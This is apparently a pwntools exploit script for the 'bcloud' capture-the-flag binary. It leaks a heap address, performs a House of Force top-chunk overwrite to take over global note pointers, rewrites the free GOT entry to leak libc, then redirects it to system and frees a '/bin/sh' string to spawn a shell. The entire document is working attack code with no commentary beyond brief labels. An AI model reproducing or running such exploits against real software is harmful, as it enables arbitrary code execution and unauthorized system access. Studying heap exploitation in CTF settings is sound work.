from pwn import *

r = process('./bcloud')
e = ELF('./bcloud')
libc = e.libc
context.arch = 'i386'
sizes = 0x0804B0A0
bag = 0x0804B120

def create(size, content):
    r.sendlineafter('option--->>\n', '1')
    r.sendlineafter('Input the length of the note content:\n', str(size))
    r.sendlineafter('Input the content:\n', content)
def edit(index, content):
    r.sendlineafter('option--->>\n', '3')
    r.sendlineafter('Input the id:\n', str(index))
    r.sendlineafter('Input the new content:\n', content)
def delete(index):
    r.sendlineafter('option--->>\n', '4')
    r.sendlineafter('Input the id:\n', str(index))

# leak heap
r.sendafter('Input your name:\n', 'A'*0x40)
r.recvuntil('A'*0x40)
heap_base = u32(r.recv(4)) - 0x8
log.info('heap base: %#x' % heap_base)
r.sendafter('Org:\n', 'A'*0x40)
r.sendlineafter('Host:\n', p32(0xffffffff))

# overwrite global variable
top_addr = heap_base + 0xd8
lag = sizes - 0x10 - top_addr
create(lag, '')
create(0x100, p32(0x60)*10+'\x00'*0x58+p32(e.got['free'])+p32(e.got['puts'])+p32(bag))

# leak libc
edit(0, p32(e.plt['puts']))
delete(1)
puts = u32(r.recv(4))
libc_base = puts - libc.symbols['puts']
log.info('libc base: %#x' % libc_base)

# renew global variable and exploit
sh = libc_base + libc.search('/bin/sh\x00').next()
system = libc_base + libc.symbols['system']
edit(2, p32(e.got['free'])+p32(sh))
edit(0, p32(system))
delete(1)


r.interactive()
